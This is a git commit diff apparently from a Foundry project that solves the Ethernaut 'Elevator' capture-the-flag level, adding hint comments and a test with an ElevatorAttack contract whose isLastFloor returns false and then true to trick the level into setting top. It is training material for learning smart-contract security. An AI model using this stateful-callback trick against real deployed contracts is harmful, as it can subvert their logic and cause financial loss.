3e96c39c1696e7b32af58e8750b912d5d4c85c50
islu <38793955+islu@users.noreply.github.com>
2024-04-17 14:05:00 +0800

    solve challenge (elevator)

--- src/levels/Elevator.sol
+++ src/levels/Elevator.sol
@@ -5,6 +5,11 @@ interface Building {
     function isLastFloor(uint256) external returns (bool);
 }
 
+// This elevator won't let you reach the top of your building. Right?
+//
+// Things that might help:
+//  - Sometimes solidity is not good at keeping promises.
+//  - This Elevator expects to be used from a Building.
 contract Elevator {
     bool public top;
     uint256 public floor;
--- test/Elevator.t.sol
+++ test/Elevator.t.sol
@@ -5,19 +5,58 @@ import {EthernautTest} from "./utils/EthernautTest.sol";
 import {ElevatorFactory} from "../src/factories/ElevatorFactory.sol";
 import {Elevator} from "../src/levels/Elevator.sol";
 
+import "forge-std/console.sol";
+
 contract ElevatorTest is EthernautTest {
     function setUp() public override {
-	super.setUp();
+        super.setUp();
         ElevatorFactory factory = new ElevatorFactory();
         ethernaut.registerLevel(factory);
         levelAddress = ethernaut.createLevelInstance(factory);
     }
 
     function testSolveElevator() public {
-        Elevator instance = Elevator(payable(levelAddress));
+        Elevator elevator = Elevator(payable(levelAddress));
 
-	// insert your code here!
-	
+        // [START]
+
+        console.log("[Before] top:");
+        console.logBool(elevator.top());
+
+        // 1. Deploy attacker contract
+        ElevatorAttack attacker = new ElevatorAttack(payable(levelAddress));
+
+        uint256 floor = 10; // Whatever floor you want to go to
+        attacker.goTo(floor);
+
+        console.log("[After] top:");
+        console.logBool(elevator.top());
+
+        // [END]
+
         assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+    }
+}
+
+// Attacker contract
+contract ElevatorAttack {
+    Elevator public target;
+    bool public flag;
+
+    constructor(address _target) {
+        target = Elevator(_target);
+        flag = false;
+    }
+
+    function goTo(uint256 _floor) public {
+        target.goTo(_floor);
+    }
+
+    function isLastFloor(uint256 _floor) external returns (bool) {
+        if (flag == false) {
+            flag = true;
+            return false;
+        }
+        return true;
     }
 }
